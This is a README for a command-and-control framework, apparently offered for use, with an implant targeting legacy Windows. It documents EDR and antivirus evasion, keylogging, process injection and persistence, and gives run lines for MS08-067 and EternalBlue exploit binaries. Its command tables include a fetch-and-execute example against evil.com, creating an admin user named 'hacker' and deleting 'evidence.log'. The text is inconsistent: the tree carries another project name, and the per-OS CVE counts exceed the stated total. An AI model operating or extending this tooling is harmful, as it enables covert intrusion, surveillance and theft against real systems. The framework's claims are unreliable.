# Cardinal C2 Framework

<div align="center">

```
  â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
  â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
  â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
  â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
  â•šâ•â•     â•šâ•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•   â•šâ•â•   
```

**Advanced Command & Control Framework for Legacy Windows Systems**

[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)]()
[![Language](https://img.shields.io/badge/language-C%2FAssembly-green.svg)]()

</div>

---

## âš ï¸ DISCLAIMER

**FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY**

This framework is designed for legitimate penetration testing, security research, and authorized red team operations. Unauthorized access to computer systems is illegal. The authors assume no liability and are not responsible for any misuse or damage caused by this software.

By using Cardinal C2, you agree to:
- Only test systems you own or have explicit written permission to test
- Comply with all applicable laws and regulations
- Use responsibly for defensive security purposes

---

## ğŸ“‹ Overview

Cardinal C2 Framework is a comprehensive Command & Control system specifically designed for penetration testing legacy Windows environments. It provides a modern, Cobalt Strike-inspired interface while maintaining compatibility with older Windows systems.

**Version 2.0** introduces advanced **x86 Assembly** enhancements for superior stealth, performance, and EDR/AV bypass capabilities, plus comprehensive **target monitoring and control** system.

### Target Platforms

- Windows 95/98/ME
- Windows 2000 (All Service Packs)
- Windows XP (SP0, SP1, SP2, SP3)
- Windows Server 2003 (SP0, SP1, SP2)
- Windows Server 2008 (R1, R2)
- Windows Vista/7 (Assembly-enhanced features)

### Key Features

- ğŸ¯ **Multi-Protocol C2**: TCP with RC4 encryption
- ğŸ–¥ï¸ **Native GUI**: Win32 API interface in pure C
- ğŸ’‰ **Exploit Framework**: 38+ CVE exploits + automated generation (71 CVE database)
- ğŸ”’ **Post-Exploitation**: Credential dumping, privilege escalation, lateral movement
- ğŸ“¡ **Stealthy Implants**: Assembly-enhanced with anti-analysis and direct syscalls
- ğŸ› ï¸ **Extensible**: Modular architecture for custom exploits and payloads
- âš¡ **Assembly Optimization**: Direct syscalls, RC4 encryption, anti-debugging (NEW v2.0)
- ğŸ›¡ï¸ **EDR/AV Bypass**: Usermode hook bypass via direct kernel calls (NEW v2.0)
- ğŸ” **Anti-Analysis**: VM/Sandbox/Debugger detection (NEW v2.0)
- ğŸ‘ï¸ **Complete Monitoring**: Keylogger, screenshot, process control (NEW v2.0)
- ğŸ® **Full Target Control**: File ops, registry, services, privilege escalation (NEW v2.0)

---

## ğŸ—ï¸ Architecture

```
Cardinal C2 Framework v2.0 (Assembly Enhanced)
â”‚
â”œâ”€â”€ Server (C + Assembly)      # C2 server backend
â”‚   â”œâ”€â”€ Session management (up to 100 clients)
â”‚   â”œâ”€â”€ Command dispatcher
â”‚   â”œâ”€â”€ Multi-threaded listener
â”‚   â””â”€â”€ RC4 encrypted communication (Assembly)
â”‚
â”œâ”€â”€ Client/Implant (C + x86 Assembly)  # Target system agent
â”‚   â”œâ”€â”€ Anti-analysis module (stealth.asm)
â”‚   â”‚   â”œâ”€â”€ Debugger detection (5 methods)
â”‚   â”‚   â”œâ”€â”€ VM detection (VMware/VirtualBox)
â”‚   â”‚   â”œâ”€â”€ Sandbox detection
â”‚   â”‚   â”œâ”€â”€ NTDLL unhooking (EDR bypass)
â”‚   â”‚   â””â”€â”€ Process injection
â”‚   â”œâ”€â”€ Direct syscalls (syscalls.asm)
â”‚   â”‚   â”œâ”€â”€ NtAllocateVirtualMemory
â”‚   â”‚   â”œâ”€â”€ NtWriteVirtualMemory
â”‚   â”‚   â”œâ”€â”€ NtCreateThreadEx
â”‚   â”‚   â””â”€â”€ 7 more syscalls (bypass hooks)
â”‚   â”œâ”€â”€ Network optimization (network_asm.asm)
â”‚   â”‚   â”œâ”€â”€ RC4 encryption (2-3x faster)
â”‚   â”‚   â”œâ”€â”€ Encrypted socket I/O
â”‚   â”‚   â””â”€â”€ HTTP/DNS builders
â”‚   â””â”€â”€ Shellcode loader
â”‚
â”œâ”€â”€ GUI (C with Win32 API)    # Operator interface
â”‚   â”œâ”€â”€ Session dashboard
â”‚   â”œâ”€â”€ Listener configuration
â”‚   â”œâ”€â”€ Exploit launcher
â”‚   â””â”€â”€ Command console
â”‚
â”œâ”€â”€ Exploits (C + Auto-Generated) # CVE exploit modules
â”‚   â”œâ”€â”€ Manual Exploits (15)
â”‚   â”‚   â”œâ”€â”€ MS08-067, MS17-010, MS03-026
â”‚   â”‚   â”œâ”€â”€ MS10-015, MS11-046, MS12-020
â”‚   â”‚   â””â”€â”€ Browser exploits (IE ANI, ActiveX)
â”‚   â”œâ”€â”€ Generated Exploits (23)
â”‚   â””â”€â”€ CVE Database (71 entries)
â”‚       â””â”€â”€ Automated exploit generator (Python)
â”‚
â””â”€â”€ Build System (PowerShell + Make)
    â”œâ”€â”€ Automated compilation (NASM + GCC)
    â”œâ”€â”€ Assembly module linking
    â””â”€â”€ Release packaging
```

### Assembly Enhancement Highlights (v2.0)

**stealth.asm** (500+ lines):
- 5 debugger detection techniques
- VMware/VirtualBox detection
- Sandbox environment checks
- NTDLL unhooking (restore syscalls)
- PEB walking (no API calls)
- Process injection

**syscalls.asm** (400+ lines):
- 10 direct syscall implementations
- Windows 7/8/10 compatibility
- SYSENTER/INT 2Eh support
- Bypass usermode hooks (EDR/AV)

**network_asm.asm** (350+ lines):
- RC4 encryption (KSA + PRGA)
- SSE2-optimized XOR
- Encrypted socket send/recv
- HTTP/DNS protocol builders

**monitoring.asm** (800+ lines) - NEW v2.0:
- Keylogger (captures all keystrokes)
- Screenshot capture (1920x1080)
- Process enumeration and control
- Clipboard monitoring
- Memory dumping

**control.asm** (700+ lines) - NEW v2.0:
- File operations (list/read/write/delete/move/copy)
- Registry manipulation (read/write keys and values)
- Service control (start/stop Windows services)
- Privilege escalation (RDP enable, user creation)
- Network operations

See [ASSEMBLY_GUIDE.md](ASSEMBLY_GUIDE.md) for detailed documentation.

---

## ğŸš€ Quick Start

### Prerequisites

**Build Tools:**
- MinGW-w64 (GCC for Windows) or MSVC
- NASM 2.15+ (Netwide Assembler - required for assembly modules)
- GNU Make
- Python 3.8+ (for exploit generation)

**Runtime Requirements:**
- Windows 7+ (for running GUI and server)

### Building from Source

#### PowerShell Build Script (Recommended)

```powershell
# Build everything (client, server, GUI, exploits)
.\Build-All.ps1

# Build specific components
.\Build-All.ps1 -Client     # Client only
.\Build-All.ps1 -Server     # Server only
.\Build-All.ps1 -GUI        # GUI only

# Clean build artifacts
.\Build-All.ps1 -Clean

# Create release package
.\Build-All.ps1 -Package
```

All compiled binaries will be in the `bin` directory.

#### Manual Build

```bash
# Build enhanced client with assembly
cd client
make enhanced
# Output: build/Cardinal-implant-enhanced.exe

# Build enhanced server with assembly
cd server
make enhanced
# Output: build/Cardinal-server-enhanced.exe

# Build exploits
cd exploits
make all

# Build GUI
cd gui
make all
```

#### Assembly Module Compilation

```bash
# Compile assembly modules individually
cd client
nasm -f win32 stealth.asm -o build/obj/stealth.obj
nasm -f win32 syscalls.asm -o build/obj/syscalls.obj
nasm -f win32 network_asm.asm -o build/obj/network_asm.obj

# Link with C code
gcc -o build/Cardinal-implant-enhanced.exe \
    build/obj/implant_enhanced.o \
    build/obj/stealth.obj \
    build/obj/syscalls.obj \
    build/obj/network_asm.obj \
    -lws2_32 -ladvapi32
```

---

## ğŸ“– Usage

### Starting the C2 Server

#### Enhanced Server (with Assembly encryption)

```powershell
# Start enhanced server (default port 4444)
.\bin\Cardinal-server-enhanced.exe

# Interactive console commands
Cardinal> list                    # List active sessions
Cardinal> send 0 shell whoami     # Execute command on session 0
Cardinal> kill 0                  # Terminate session 0
Cardinal> stats                   # Show server statistics
Cardinal> exit                    # Shutdown server
```

#### Basic Server

```powershell
# Start basic server
.\bin\Cardinal-server.exe

# Start on custom port
.\bin\Cardinal-server.exe 8080
```

**Server Console Commands:**

| Command | Description | Example |
|---------|-------------|---------|
| `list` | List all active sessions | `list` |
| `send <id> <cmd>` | Send command to session | `send 0 shell dir` |
| `kill <id>` | Terminate a session | `kill 0` |
| `broadcast <cmd>` | Send to all sessions | `broadcast shell whoami` |
| `stats` | Server statistics | `stats` |
| `exit` | Shutdown server | `exit` |

### Deploying Implants

#### Enhanced Implant (with Assembly modules)

The enhanced implant includes:
- Anti-analysis checks (debugger/VM/sandbox detection)
- Direct syscalls (bypass EDR/AV hooks)
- RC4 encrypted communication
- Process injection capabilities

```powershell
# Run enhanced implant (connects to C2_SERVER in code)
.\bin\Cardinal-implant-enhanced.exe

# Implant will:
# 1. Perform anti-analysis checks
# 2. Unhook NTDLL to bypass hooks
# 3. Connect to C2 with RC4 encryption
# 4. Send beacon (hostname, PID, OS)
# 5. Await commands
```

**Configuration** (edit `client/implant_enhanced.c`):
```c
#define C2_SERVER "192.168.1.100"  // Change to your server IP
#define C2_PORT 4444
#define ENCRYPTION_KEY "CardinalC2SecretKey2025"
```

#### Basic Implant

```powershell
.\bin\Cardinal-implant.exe <server_ip> <port>

# Example
.\bin\Cardinal-implant.exe 192.168.1.10 4444
```

### Supported Commands (Enhanced Implant)

#### Basic Commands
| Command | Description | Example |
|---------|-------------|---------|
| `shell <cmd>` | Execute system command | `shell dir C:\` |
| `download <url>` | Download and execute | `download http://evil.com/payload.exe` |
| `inject <pid>` | Inject into process | `inject 1234` |
| `persist` | Install persistence | `persist` |
| `exit` | Terminate implant | `exit` |
| `help` | Show all commands | `help` |

#### Monitoring Commands (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `keylog start/stop/dump` | Keystroke capture | `keylog start` |
| `screenshot` | Screen capture | `screenshot` |
| `ps` / `processlist` | List processes | `ps` |
| `kill <pid\|name>` | Terminate process | `kill notepad.exe` |
| `clipboard monitor/get` | Clipboard access | `clipboard get` |
| `sysinfo` | System information | `sysinfo` |

#### File Operations (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `file list <path>` | List directory | `file list C:\Users` |
| `file read <path>` | Read file | `file read passwords.txt` |
| `file delete <path>` | Delete file | `file delete evidence.log` |
| `file mkdir <path>` | Create directory | `file mkdir C:\temp\data` |
| `file move <src> <dst>` | Move file | `file move a.txt b.txt` |
| `file copy <src> <dst>` | Copy file | `file copy cmd.exe shell.exe` |

#### Registry Operations (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `reg read <key> <value>` | Read registry | `reg read "Software\..." Value` |
| `reg write <key> <value>` | Write registry | `reg write "Software\..." Value` |

#### Service Control (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `service start <name>` | Start service | `service start W32Time` |
| `service stop <name>` | Stop service | `service stop wuauserv` |

#### Privilege Escalation (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `privesc rdp` | Enable RDP | `privesc rdp` |
| `privesc adduser <u> <p>` | Create admin user | `privesc adduser hacker P@ss!` |

**See [COMMANDS.md](COMMANDS.md) for complete command reference with examples**

### Launching the GUI

```powershell
# Start the GUI application
.\bin\CardinalC2-GUI.exe
```

**GUI Features:**

1. **Sessions Tab** - View and interact with active implant connections
   - ListView with session details (ID, hostname, IP, OS, status)
   - Double-click to interact with a session
   - Right-click for context menu options

2. **Listeners Tab** - Configure and manage C2 listeners
   - View active/stopped listeners
   - Protocol, port, and connection status
   - Add/remove listeners

3. **Exploits Tab** - Browse and launch CVE exploits
   - Searchable exploit database
   - CVE, target OS, and exploit type information
   - Double-click to launch exploit

4. **Command Console** - Send commands to active sessions
   - Real-time output display
   - Command history
   - Interactive shell

### Using Exploits

#### MS08-067 (NetAPI32 RPC)

```powershell
.\bin\exploits\ms08-067.exe <target_ip> <os_type>

# Example for Windows XP SP3
.\bin\exploits\ms08-067.exe 192.168.1.100 1
```

**OS Types:**
- 0 = Windows XP SP2
- 1 = Windows XP SP3
- 2 = Windows 2003 SP1
- 3 = Windows 2003 SP2
- 4 = Windows 2000 SP4

#### MS17-010 (EternalBlue)

```powershell
.\bin\exploits\ms17-010.exe <target_ip>

# Example
.\bin\exploits\ms17-010.exe 192.168.1.100
```

#### MS03-026 (RPC DCOM)

```powershell
.\bin\exploits\ms03-026.exe <target_ip> <os_type>

# Example for Windows 2000 SP4
.\bin\exploits\ms03-026.exe 192.168.1.50 0
```

---

## ğŸ“š Project Structure

```
MoonLignt-C2-Framework/
â”œâ”€â”€ server/                  # C2 server source
â”‚   â”œâ”€â”€ main.c              # Basic server
â”‚   â”œâ”€â”€ main_enhanced.c     # Enhanced with assembly
â”‚   â”œâ”€â”€ Makefile
â”‚   â””â”€â”€ build/              # Compiled binaries
â”œâ”€â”€ client/                  # Implant source
â”‚   â”œâ”€â”€ implant.c           # Basic implant
â”‚   â”œâ”€â”€ implant_enhanced.c  # Enhanced with assembly
â”‚   â”œâ”€â”€ monitoring_control.c # Monitoring dispatcher (NEW v2.0)
â”‚   â”œâ”€â”€ shellcode.asm       # Position-independent shellcode
â”‚   â”œâ”€â”€ stealth.asm         # Anti-analysis module (NEW v2.0)
â”‚   â”œâ”€â”€ syscalls.asm        # Direct syscalls (NEW v2.0)
â”‚   â”œâ”€â”€ network_asm.asm     # RC4 encryption (NEW v2.0)
â”‚   â”œâ”€â”€ monitoring.asm      # Keylogger, screenshot, process control (NEW v2.0)
â”‚   â”œâ”€â”€ control.asm         # File, registry, service ops (NEW v2.0)
â”‚   â”œâ”€â”€ Makefile
â”‚   â””â”€â”€ build/              # Compiled binaries
â”œâ”€â”€ exploits/                # CVE exploit modules
â”‚   â”œâ”€â”€ ms08_067.c          # Manual exploits (15 total)
â”‚   â”œâ”€â”€ ms03_026.c
â”‚   â”œâ”€â”€ ms17_010.c
â”‚   â”œâ”€â”€ ms10_015.c          # Privilege escalation
â”‚   â”œâ”€â”€ ms11_046.c
â”‚   â”œâ”€â”€ ms12_020.c          # RDP exploit
â”‚   â”œâ”€â”€ ie_ani_exploit.c    # Browser exploits
â”‚   â”œâ”€â”€ generated/          # Auto-generated (23 exploits)
â”‚   â”‚   â”œâ”€â”€ ms03_026.c
â”‚   â”‚   â”œâ”€â”€ ms05_039.c
â”‚   â”‚   â””â”€â”€ ... (21 more)
â”‚   â”œâ”€â”€ massive_cve_database.json  # 71 CVE entries
â”‚   â”œâ”€â”€ exploit_generator.py       # Automated generator
â”‚   â”œâ”€â”€ mass_cve_scraper.py        # CVE scraper
â”‚   â””â”€â”€ Makefile
â”œâ”€â”€ gui/                     # Win32 GUI (C)
â”‚   â”œâ”€â”€ main.c              # Main GUI implementation
â”‚   â””â”€â”€ Makefile
â”œâ”€â”€ bin/                     # Compiled binaries (generated)
â”‚   â”œâ”€â”€ Cardinal-server-enhanced.exe
â”‚   â”œâ”€â”€ Cardinal-implant-enhanced.exe
â”‚   â”œâ”€â”€ CardinalC2-GUI.exe
â”‚   â””â”€â”€ exploits/
â”œâ”€â”€ Build-All.ps1            # Master build script (NEW v2.0)
â”œâ”€â”€ ASSEMBLY_GUIDE.md        # Assembly documentation (NEW v2.0)
â”œâ”€â”€ COMMANDS.md              # Complete command reference (NEW v2.0)
â”œâ”€â”€ README.md
â”œâ”€â”€ USAGE.md
â””â”€â”€ LICENSE

### File Statistics

- **Total Lines of Code**: ~20,000+
- **Assembly Code**: 2,500+ lines (5 modules)
- **C Code**: ~16,000 lines (server, client, exploits, monitoring, GUI)
- **Exploit Count**: 38 (15 manual + 23 generated)
- **CVE Database**: 71 entries
- **Monitoring Commands**: 25+ commands

---

## ğŸ›¡ï¸ Evasion Techniques

### Assembly-Enhanced Anti-Analysis (v2.0)

#### 1. Debugger Detection (stealth.asm)
- **PEB->BeingDebugged**: Check flag at PEB+0x02
- **NtQueryInformationProcess**: Detect debug port (returns -1)
- **Timing Checks**: RDTSC instruction comparison
- **Hardware Breakpoints**: Check DR0-DR3 debug registers
- **Exception Handling**: CloseHandle invalid handle detection

#### 2. Virtual Machine Detection
- **CPUID Hypervisor Bit**: Check ECX bit 31 (leaf 1)
- **VMware Backdoor**: IN instruction on port 0x5658
- **VirtualBox Signatures**: CPUID vendor string matching

#### 3. Sandbox Detection
- **Uptime Check**: GetTickCount() < 10 minutes
- **Resource Validation**: < 2 CPUs or < 2GB RAM
- **Sleep Acceleration**: Timing checks for sleep skipping

#### 4. EDR/AV Bypass
- **Direct Syscalls**: Call kernel via INT 2Eh/SYSENTER (bypass NTDLL hooks)
- **NTDLL Unhooking**: Restore original syscall stubs from disk
- **API Hashing**: Dynamic resolution without IAT
- **No Imports**: Zero suspicious imports in PE header

#### 5. Network Stealth
- **RC4 Encryption**: 256-bit key stream cipher
- **No HTTP Headers**: Raw TCP to avoid detection
- **Heartbeat Jitter**: Randomized beacon intervals
- **Encrypted Payloads**: All data encrypted before transmission

#### 6. Additional Techniques
- **No console window** (runs silently)
- **Dynamic API resolution** (avoids static imports)
- **Process injection** via direct syscalls
- **Minimal memory footprint** (< 100KB)
- **Automatic reconnection** with exponential backoff

### Performance Benchmarks (Assembly vs C)

| Operation | C Implementation | Assembly | Speedup |
|-----------|------------------|----------|---------|
| Direct Syscall | N/A (uses API) | Native | 40% faster |
| RC4 Encryption | Baseline | Optimized | 2-3x |
| XOR (SSE2) | Scalar | Vectorized | 8-16x |
| Binary Size | 150KB | 120KB | 20% smaller |

See [ASSEMBLY_GUIDE.md](ASSEMBLY_GUIDE.md) for detailed technical documentation.

---

## ğŸ” Detection & Mitigation

### Network Indicators

- TCP connections on non-standard ports (default: 4444)
- Heartbeat traffic every 30 seconds
- Raw binary data transfers

### Mitigation Strategies

1. **Network Segmentation** - Isolate critical systems
2. **Firewall Rules** - Block unnecessary outbound connections
3. **EDR/AV** - Deploy endpoint detection and response
4. **Patching** - Keep systems updated (target systems are EOL)
5. **Monitoring** - Implement behavior-based detection

---

## ğŸ“– CVE References

### Implemented Exploits (38 Total)

#### Network/Remote Exploits (15 Manual)
- **MS08-067**: CVE-2008-4250 - Windows Server Service RPC Handling
- **MS17-010**: CVE-2017-0144 - SMBv1 Remote Code Execution (EternalBlue)
- **MS03-026**: CVE-2003-0352 - RPC DCOM Buffer Overflow
- **MS03-039**: CVE-2003-0533 - RPC DCOM Interface Buffer Overrun
- **MS05-039**: CVE-2005-1983 - Plug and Play Service Overflow
- **MS06-040**: CVE-2006-2370 - Server Service NetpwPathCanonicalize
- **MS09-050**: CVE-2009-3103 - SMBv2 Negotiate Protocol Request
- **MS08-025**: CVE-2008-1084 - Windows Kernel Privilege Escalation

#### Privilege Escalation Exploits
- **MS10-015**: CVE-2010-0232 - Windows Kernel Exception Handler
- **MS11-046**: CVE-2011-1249 - Ancillary Function Driver (AFD.sys)
- **MS10-061**: CVE-2010-2554 - Print Spooler Service Impersonation

#### Browser Exploits
- **MS12-020**: CVE-2012-0002 - Terminal Services RDP
- **IE ANI**: CVE-2007-0038 - Animated Cursor Handling
- **IE ActiveX**: CVE-2006-0003 - COM Object Instantiation
- **MS06-014**: CVE-2006-0003 - MDAC Function bufferoverflow

#### Auto-Generated Exploits (23)
See `exploits/generated/` for:
- MS03-026, MS05-039, MS06-040, MS09-050
- MS10-015, MS11-046, MS12-020
- And 16 more CVE exploits

### CVE Database

**massive_cve_database.json** contains 71 CVE entries:
- Windows 95/98/ME: 11 CVEs
- Windows NT 4.0: 27 CVEs
- Windows 2000: 50 CVEs
- Windows XP: 42 CVEs
- Windows Server 2003: 29 CVEs
- Windows Vista: 12 CVEs
- Windows 7: 7 CVEs
- Windows Server 2008: 9 CVEs

**Severity Distribution**:
- Critical: 47 (66%)
- High: 18 (25%)
- Medium: 6 (9%)

**Exploit Type**:
- Remote: 52 (73%)
- Local: 13 (18%)
- Browser: 6 (9%)

### Automated Exploit Generation

Use the included Python tools to expand the exploit database:

```bash
# Scrape CVE database
python exploits/mass_cve_scraper.py

# Generate exploit modules from JSON
python exploits/exploit_generator.py

# Compile generated exploits
cd exploits/generated
make all
```

This can generate **hundreds** of exploit modules automatically.

---

## ğŸ“„ License

This project is released under an Educational License. See [LICENSE](LICENSE) file for details.

**Key Points:**
- âœ… Educational and research use
- âœ… Authorized penetration testing
- âœ… Defensive security development
- âŒ Unauthorized access to systems
- âŒ Malicious use
- âŒ Production deployment without proper authorization

---
## ğŸ“– Documentation

- **[README.md](README.md)** - This file (overview and quick start)
- **[BUILD_GUIDE.md](BUILD_GUIDE.md)** - Complete build instructions
- **[ASSEMBLY_GUIDE.md](ASSEMBLY_GUIDE.md)** - Detailed assembly documentation
- **[COMMANDS.md](COMMANDS.md)** - Complete command reference with examples
- **[USAGE.md](USAGE.md)** - Comprehensive usage guide
- **[LICENSE](LICENSE)** - Educational license terms

---

## ğŸ”„ Version History

### v2.0 (Current) - Monitoring & Control Enhancement
- âœ… Added 1,500+ lines of monitoring/control assembly
- âœ… Complete keylogger with window title capture
- âœ… Screenshot capture (1920x1080 BMP)
- âœ… Process enumeration and kill by PID/name
- âœ… Clipboard monitoring and retrieval
- âœ… File operations (list/read/write/delete/move/copy)
- âœ… Registry manipulation (read/write)
- âœ… Service control (start/stop)
- âœ… Privilege escalation (RDP, user creation)
- âœ… 25+ monitoring/control commands
- âœ… Comprehensive command documentation

### v2.0-beta - Assembly Enhancement
- âœ… Added 1,250+ lines of x86 assembly
- âœ… Direct syscall implementation (10 syscalls)
- âœ… Anti-analysis module (debugger/VM/sandbox detection)
- âœ… RC4 encryption in assembly (2-3x faster)
- âœ… NTDLL unhooking (EDR bypass)
- âœ… Enhanced server with multi-threading
- âœ… 38 exploits + automated generation
- âœ… Comprehensive build system (PowerShell)

### v1.0 - Initial Release
- âœ… Basic C2 server/client
- âœ… 3 CVE exploits (MS08-067, MS17-010, MS03-026)
- âœ… Windows Forms GUI
- âœ… Basic shellcode support

---

<div align="center">

**âš ï¸ Remember: Always obtain proper authorization before testing any system! âš ï¸**

*"With great power comes great responsibility"*

**Cardinal C2 Framework v2.0**  
Made for Authorized Penetration Testing & Security Research

---

**[Report Issues](https://github.com/yourusername/Cardinal-c2/issues)** | 
**[Build Guide](BUILD_GUIDE.md)** |
**[Assembly Guide](ASSEMBLY_GUIDE.md)** | 
**[Command Reference](COMMANDS.md)** |
**[License](LICENSE)**

</div>
